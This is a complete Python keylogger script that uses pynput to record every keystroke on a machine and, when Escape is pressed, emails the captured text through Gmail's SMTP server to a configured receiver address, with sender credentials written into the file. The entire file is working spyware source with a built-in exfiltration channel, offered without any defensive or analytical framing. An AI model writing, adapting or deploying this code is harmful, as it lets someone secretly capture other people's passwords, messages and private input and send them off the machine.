import smtplib
from email.message import EmailMessage
from pynput.keyboard import Key, Listener

keys = []

sender = 'example@gmail.com'  # email that you will use to send logs
password = 'qwerty123'  # password to sender
receiver = 'my@email.com'  # email that you want to receive logs
smtp_server = 'smtp.gmail.com'  # smtp server address for sender email
port = 587  # usually it i 587 or 465


def message(content, subject='keylogger'):
    # used to create an email message
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = receiver
    msg.set_content(content)
    return msg

def send_email(msg):
    # used to send a message created by function message()
    connection = smtplib.SMTP(smtp_server, port)
    connection.ehlo()
    connection.starttls()
    connection.login(sender, password)
    connection.send_message(msg)
    connection.quit()

def press(key):
    # individual condition for numpad keys
    if hasattr(key, 'vk') and 96 <= key.vk <= 105:
        keys.append(str(key.vk-96))
    # other keys
    else:
        k = str(key).replace("'", "")
        if k.find('space') != -1:
            keys.append(' ')
        elif k.find('enter') != -1:
            keys.append('\n')
        elif k.find('Key') == -1:
            keys.append(k)
    print(f'{key} pressed')

def release(key):
    # the program terminates and sends the captured
    # logs when the user presses escape key
    if key == Key.esc:
        text = ''.join(keys)
        content = message(text)
        send_email(content)
        return False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()
